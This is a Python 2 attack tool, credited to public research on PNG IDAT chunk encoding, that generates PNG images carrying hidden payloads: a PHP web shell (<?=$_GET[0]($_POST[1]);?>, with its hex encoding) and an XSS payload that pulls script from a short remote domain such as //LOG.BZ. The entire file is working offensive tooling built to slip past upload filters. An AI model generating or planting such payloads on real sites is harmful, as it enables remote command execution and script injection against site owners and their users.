#!/usr/bin/python
'''
Author: Hunter Gregal
Based off of code and concepts:
	Adam Logue -- https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks
	IDontPlayDarts -- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
	fin1te -- https://whitton.io/articles/xss-on-facebook-via-png-content-types
	Vavkamil -- https://github.com/vavkamil/PNG-IDAT-chunks
Payloads:
	WebShell: <?=$_GET[0]($_POST[1]);?>
	XSS:	Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
'''
from coreFunctions import *
import argparse,sys

#args
parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")

#parser.add_argument('-v', '--verbose', dest='verbose', help='Optional: verbose mode', action='store_true', default=False)

parser.add_argument('-m', '--method', dest='method', help='Choose payload method, -h to view available methods', choices=['xss','php'], required=True, type=str)
parser.add_argument('-r', '--remote-domain', dest='remoteDomain', help='Remote domain to retrieve payload from (shorter the better: ex. xx.xxx)', type=str)
parser.add_argument('-o', '--output-file', dest='outputImage', help='Output payload to PNG file', required=True, type=str)
args = parser.parse_args()

if __name__ == '__main__':
	#if PHP webshell do it:
	#else assume xss method
	
	#init args
	method = args.method
	outputImage = args.outputImage
	
	if "xss" in method:
		if args.remoteDomain:
			remoteDomain = (args.remoteDomain).upper()
			prefix,tld = remoteDomainParse(remoteDomain)
		else:
			print "[+]XSS Method Requires remote-domain"
			sys.exit(0)
		#If Domain larger than 3 chars
		if len(prefix) > 3:
			print "Domains larger than 3 chars not supported yet!"
		#Check possible bruteforce methods
		else:
			gzdeflatePayload = calcBruteMethod(remoteDomain, prefix, tld)
		#If failed, quit
		if not gzdeflatePayload:
			print "[+] Payload Failed to Generate...exiting"
			sys.exit(0)
		#Generate filter-bypass
		payload = filterBypass(gzdeflatePayload)
		#Create Payload PNG
		generateFinalPayload(payload, outputImage)
	else:
		#PHP payload
		print "[+] PHP Method Selected. Using 'idontplaywithdarts' payload"
		payload = "03a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310"
		print "[-] Payload String: <?=$_GET[0]($_POST[1]);?>"
		print "[-] Payload: %s " % payload
		filterproof = filterBypass(payload)
		generateFinalPayload(payload, outputImage)
	print "[+] Fin"
